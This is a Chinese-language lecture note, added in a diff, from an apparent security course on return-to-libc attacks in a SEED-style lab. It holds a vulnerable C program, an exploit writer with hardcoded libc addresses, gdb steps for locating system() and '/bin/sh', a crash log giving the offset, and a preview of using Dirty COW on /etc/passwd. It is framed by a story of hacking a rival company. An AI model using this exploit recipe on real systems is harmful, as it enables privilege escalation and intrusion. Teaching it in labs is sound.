@@ -1,0 +1,174 @@
+## 虚拟黑客故事：
+
+首先介绍一个小场景，小明是A公司委托的黑客，
+需要入侵竞争公司B的系统，获取机密文件。
+
+公司A和公司B在公关上是表面兄弟，有业务往来，
+通过社会工程学套路得到：
+公司A的系统上栈不可执行，在第一期live中介绍的
+缓冲区溢出攻击无法奏效。
+
+小明同学设计骗的一个A公司的一个普通员工帐号密码，
+登录到了系统后台，于是开始了return to libc攻击。
+
+## 回顾上一次的实验内容：
+1首先.
+介绍了shellcode是一段可执行代码，
+shellcode长什么样子，shellcode怎么运行，
+以及函数指针的函数，汇编角度解读了shellcode
+
+2.然后，
+我们需要把这段代码放入内存的buffer中
+通过缓冲区溢出漏洞，触发这段可执行代码。
+我们介绍了函数栈的模型，函数参数，返回地址，
+基址寄存器ebp，栈顶寄存器esp,
+
+3.然后，
+介绍了一个存在缓冲区漏洞的程序，
+向这个程序中写入数据小于缓冲区长度的时候，正常执行。
+写入数据大于缓冲区长度的时候，栈溢出，
+我们覆盖了函数返回地址为栈上地址，（图片：上一次回顾）
+通过插入大量的nop空操作，让程序执行流到达shellcode
+
+4.最后，
+获得一个shell，要想获得root权限的shell，
+我们需要用root用户运行这段有漏洞的程序。
+
+## 缓冲区漏洞程序分析
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int bof(FILE *badfile)
+{
+    char buffer[12];
+
+    /* The following statement has a buffer overflow problem */
+    fread(buffer, sizeof(char), 40, badfile);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    bof(badfile);
+
+    printf("Returned Properly\n");
+
+    fclose(badfile);
+    return 1;
+}
+为了后续return-to-libc攻击能获取到root权限，
+而不是仅仅弹出一个普通用户的shell，
+我们需要编译并设置有效id为root。
+
+当badfile文件中内容大小低于缓冲区大小的时候，程序正常。
+当文件内容大小超过缓冲区大小的时候，程序异常，发生缓冲区溢出。
+
+
+## 利用return to libc攻击存在漏洞的程序，获取root shell
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char **argv)
+{
+  char buf[40];
+  FILE *badfile;
+  int base = 24;
+  badfile = fopen("./badfile", "w");
+
+  /* You need to decide the addresses and
+     the values for X, Y, Z. The order of the following
+     three statements does not imply the order of X, Y, Z.
+     Actually, we intentionally scrambled the order. */
+  *(long *) &buf[base+8] = 0xb7f7ff18;   //  "/bin/sh"
+  *(long *) &buf[base] = 0xb7e5e430;   //  system()
+  *(long *) &buf[base+4] = 0xb7e51fb0;   //  exit()
+
+  fwrite(buf, sizeof(buf), 1, badfile);
+  fclose(badfile);
+}
+
+1.如何获取libc函数地址？
+首先创建一个简单程序：
+#include <stdio.h>
+#include <stdlib.h>
+void main()
+{
+return;
+}
+通过gdb查看libc中函数的地址：
+$gcc test.c -o test
+$gdb test
+(gdb)b main
+(r)
+(gdb)p system
+(gdb)p exit
+
+2.如何获取字符串 “/bin/sh”在内存中的地址？
+方案1：设置一个临时环境变量MYSHELL=/bin/sh
+获取这个环境变量在内存中的地址
+
+#include <stdio.h>
+#include <stdlib.h>
+void main()
+{
+char* shell = getenv("MYSHELL");
+if(shell)
+	printf("%x\n",(unsigned int)shell);
+	return;
+}
+方案2：
+用获取libc中函数地址的方式，在libc.so中寻找“/bin/sh”
+(gdb)b main
+(gdb)r
+(gdb)p __libc_start_main
+$1 = 0xb7e383e0
+(gdb)find 0xb7e383e0,+2000000,"/bin/sh"
+
+3.我们获取了需要的地址之后，为什么就能返回到libc中的函数，
+执行/bin/sh操作呢？base为什么等于24呢？为什么+4 +8呢？
+  *(long *) &buf[base+8] = 0xb7f7ff18;   //  "/bin/sh"
+  *(long *) &buf[base] = 0xb7e5e430;   //  system()
+  *(long *) &buf[base+4] = 0xb7e51fb0;   //  exit()
+
+首先构造badfile
+
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+
+
+然后让栈溢出
+[02/12/2018 03:20] root@ubuntu:/home/seed/Code# ls
+a.out  badfile  makebadfile.c  ret  retlib.c
+[02/12/2018 03:21] root@ubuntu:/home/seed/Code# gcc -fno-stack-protector retlib.c -o ret -g
+[02/12/2018 03:21] root@ubuntu:/home/seed/Code# gdb ret
+Reading symbols from /home/seed/Code/ret...done.
+(gdb) r
+Starting program: /home/seed/Code/ret 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62615a59 in ?? ()
+(gdb) 
+
+查看ascii码表
+59Y
+5aZ
+61a
+62b
+
+返回地址的偏移量=24
+
+## 问答环节，下次课预告
+Dirty-COW，这个COW翻译是母牛的意思，实际上是
+Copy On Write 写时复制技术。在下次课中，
+我们将使用Dirty COW漏洞，对一个只读文件进行写操作。
+
+如果我们写/etc/passwd文件，修改了用户的uid gid为0，
+那么被修改的用户将获得root权限。
+
+好，本期live到这里就结束了，谢谢大家！
